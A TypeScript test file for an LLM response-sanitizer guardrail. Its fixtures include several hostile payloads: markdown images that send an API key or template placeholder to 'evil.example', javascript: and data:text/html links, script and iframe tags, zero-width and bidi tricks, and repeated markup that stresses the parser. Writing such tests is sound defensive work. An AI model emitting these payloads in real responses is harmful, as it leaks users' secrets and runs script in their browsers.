import test from "node:test";
import assert from "node:assert/strict";
import { guardrailRegistry } from "../../src/lib/guardrails/index.ts";

const FLAG = "RESPONSE_SANITIZER_ENABLED";
// Built from parts so no credential-shaped literal sits in the source.
const KEY = ["sk", "A".repeat(48)].join("-");

async function run(response: unknown, flag: boolean) {
  const previous = process.env[FLAG];
  if (flag) process.env[FLAG] = "true";
  else delete process.env[FLAG];
  try {
    return await guardrailRegistry.runPostCallHooks(structuredClone(response), {});
  } finally {
    if (previous === undefined) delete process.env[FLAG];
    else process.env[FLAG] = previous;
  }
}

const chat = (content: unknown) => ({
  choices: [{ index: 0, finish_reason: "stop", message: { role: "assistant", content } }],
});
const textOf = (out: { response: unknown }) =>
  (out.response as { choices: Array<{ message: { content: string } }> }).choices[0].message.content;

test("flag unset: a response with an exfil image, a script link and a bidi control passes unchanged", async () => {
  const body = chat(`![x](https://evil.example/p?k=${KEY}) [a](javascript:alert(1)) \u202Eabc`);
  const out = await run(body, false);
  assert.equal(out.blocked, false);
  assert.deepEqual(out.response, body);
});

test("flag on: a markdown image whose query carries a key is removed, a plain image stays", async () => {
  const out = await run(
    chat(
      `before ![x](https://evil.example/p?k=${KEY}) after ![logo](https://cdn.example/logo.png)`
    ),
    true
  );
  const text = textOf(out);
  assert.equal(text.includes(KEY), false);
  assert.equal(text.includes("evil.example"), false);
  assert.match(text, /before .* after !\[logo\]\(https:\/\/cdn\.example\/logo\.png\)/);
});

test("flag on: an image whose query carries a template placeholder is removed", async () => {
  const out = await run(chat("![a](https://evil.example/p?t={{api_key}}) ok"), true);
  assert.equal(textOf(out).includes("evil.example"), false);
  assert.match(textOf(out), /ok$/);
});

test("flag on: javascript: and data:text/html links are neutralised, normal links stay", async () => {
  const out = await run(
    chat("[a](javascript:alert(1)) [b](data:text/html;base64,PGI+) [c](https://ok.example/page)"),
    true
  );
  const text = textOf(out);
  assert.equal(/javascript:/i.test(text), false);
  assert.equal(/data:text\/html/i.test(text), false);
  assert.match(text, /\[c\]\(https:\/\/ok\.example\/page\)/);
});

test("flag on: a scheme hidden with a zero-width character replaces the whole text", async () => {
  const out = await run(chat("click [a](java\u200Bscript:alert(1)) now"), true);
  const text = textOf(out);
  assert.equal(text.includes("alert"), false);
  assert.equal(text.includes("click"), false);
});

test("flag on: script and iframe tags are removed", async () => {
  const out = await run(
    chat('hi <script>steal()</script> there <iframe src="https://evil.example"></iframe> end'),
    true
  );
  assert.equal(textOf(out), "hi  there  end");
});

test("flag on: a unicode bidi control blocks the response with a reason", async () => {
  const out = await run(chat("safe \u202Etxt.exe"), true);
  assert.equal(out.blocked, true);
  assert.equal(out.guardrail, "response-sanitizer");
  const last = out.results[out.results.length - 1];
  assert.equal(last.meta?.reason, "response_unicode_bidi");
});

test("flag on: Claude and Responses text blocks are cleaned, tool-call arguments are left alone", async () => {
  const claude = await run(
    { type: "message", content: [{ type: "text", text: "a <script>x()</script> b" }] },
    true
  );
  assert.equal((claude.response as { content: Array<{ text: string }> }).content[0].text, "a  b");

  const responses = await run(
    {
      object: "response",
      output: [
        { type: "message", content: [{ type: "output_text", text: "[a](javascript:alert(1))" }] },
        { type: "function_call", arguments: '{"href":"javascript:keep()"}' },
      ],
    },
    true
  );
  const output = (responses.response as { output: Array<Record<string, unknown>> }).output;
  assert.equal(/javascript:/i.test(JSON.stringify(output[0])), false);
  assert.equal(output[1].arguments, '{"href":"javascript:keep()"}');
});

// Linear-work guard without a clock: a quadratic scan would have to touch a large share of
// the characters of a 400 KB hostile text once per repetition. The regex form of the image
// scan took seconds on 8 KB; here the call must simply finish and stay correct on 400 KB.
test("flag on: hostile repeated markup is handled in one pass and stays correct", async () => {
  const hostile = [
    "![a](".repeat(80_000),
    "<script>".repeat(50_000),
    "![x](https://a.example/p?t={{".repeat(14_000),
    "<script ".repeat(50_000),
  ];
  for (const text of hostile) {
    const out = await run(chat(`${text} tail`), true);
    assert.equal(out.blocked, false);
    assert.equal(typeof textOf(out), "string");
  }
  const mixed = await run(
    chat(`${"![ok](https://a.example/p.png) ".repeat(5000)}[x](javascript:go())`),
    true
  );
  assert.equal(/javascript:/i.test(textOf(mixed)), false);
  assert.equal(textOf(mixed).includes("https://a.example/p.png"), true);
});
